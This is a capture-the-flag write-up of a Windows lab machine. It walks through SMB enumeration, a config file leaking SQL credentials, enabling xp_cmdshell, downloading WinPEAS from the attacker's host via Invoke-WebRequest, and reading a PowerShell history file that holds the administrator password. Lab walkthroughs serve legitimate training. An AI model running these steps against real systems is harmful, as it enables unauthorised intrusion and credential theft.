# Walkthrough Notes

---

## Initial Recon

First I started off by doing a routine recon scan.

![Recon Scan](./recon.png)

- First I notice there is an **ms-sql server** running on port `1433`.
- From the script scan I also notice the Nmap scan revealed that an SMB client was actively running as `Ill`.

---

## SMB Enumeration

Next I run:

```bash
smbclient -L //IP
```

to reveal the shares on the SMB client.

![SMB Shares](./smb-shares.png)

I notice the `backups` share is a non-administrator share, so I run:

```bash
smbclient -N //IP/backups
```

to investigate what's inside.

The command reveals a `prod.dtsConfig` file. I use the `get` command to download it and inspect it locally.

![prod.dtsConfig](./prod-config.png)

The file contained the SQL database credentials:

- **User:** `sql_svc`  
- **Pass:** `M3g4c0rp123`

---

## SQL Database Access

I installed `mssqlclient.py` and used the credentials to log into the SQL server:

![SQL Login](./sql-login.png)

This gave regular user-level permissions.

Trying to run `xp_cmdshell` failed due to insufficient permissions. So I enabled it using:

```sql
sp_configure 'Show advanced options', 1;
RECONFIGURE;
sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

Once enabled, I could upload and run apps on the server.

---

## Privilege Escalation - WinPEAS

I downloaded `winpeas.exe` locally and spun up a web server:

```bash
python3 -m http.server 8000
```

Then, on the SQL server I ran:

```sql
EXEC xp_cmdshell 'powershell -Command "Invoke-WebRequest -Uri http://10.10.15.240:8000/winpeas.exe -OutFile C:\Users\Public\winpeas.exe"';
```

![WinPEAS Request](./winpeas-request.png)

After the file was downloaded:

![WinPEAS Response](./winpeas-response.png)

I ran WinPEAS and saved output to a file:

```sql
EXEC xp_cmdshell 'C:\Users\Public\winpeas.exe > C:\Users\Public\peasout.txt';
```

Then read it with:

```sql
EXEC xp_cmdshell 'type C:\Users\Public\peasout.txt';
```

---

## Finding PowerShell History

While parsing `winpeas` output, I found a PowerShell history file:

```sql
EXEC xp_cmdshell 'type C:Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt';
```

![ConsoleHost History](./powershell-history.png)

It revealed:

- **Admin user:** `administrator`
- **Admin password:** `MEGACORP_4dm1n!!`

---

## Accessing Admin SMB Shares

I tried these credentials on the SQL database but had no luck.  
However, they **worked with `smbclient`**, granting access to all shares.

I navigated to:

- `Users/Administrator/Desktop` for the root flag
- `Users/sql_svc/Desktop` for the user flag

![Root Flag](./root-flag.png)
